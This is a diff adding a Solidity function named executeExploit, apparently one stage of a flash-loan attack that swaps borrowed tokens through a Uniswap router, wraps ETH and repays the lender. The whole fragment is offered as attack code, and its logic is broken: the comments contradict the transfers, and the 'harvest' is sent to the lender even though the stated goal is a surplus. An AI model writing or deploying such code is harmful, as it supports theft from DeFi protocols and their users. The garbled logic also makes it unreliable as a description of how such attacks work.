@@ -1,0 +1,24 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Swap some but not all of the borrowed tokens to increase balance
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // Token being exploited
+    path[1] = uniswapRouter.WETH(); // Swapping to ETH
+
+    // Swap half of the loaned valuable tokens to ETH
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount / 2, 0, path, address(this), block.timestamp);
+
+    // Step 2: Now deposit 10 ETH to WETH contract
+    IWETH(uniswapRouter.WETH()).deposit{value: 10 ether}();
+
+    // Step 3: Transfer half of the harvested ETH back to flashloan provider 
+    uint256 harvest = address(this).balance - 10 ether; // Calculate harvest
+    payable(flashloanProvider).transfer(harvest);
+    
+    // Step 4: Finally, repay the original debt
+    valuableToken.transfer(flashloanProvider, amount);
+    // At this point we must ensure we are ending the cycle with a surplus
+}
+</executeExploitCode>
+```
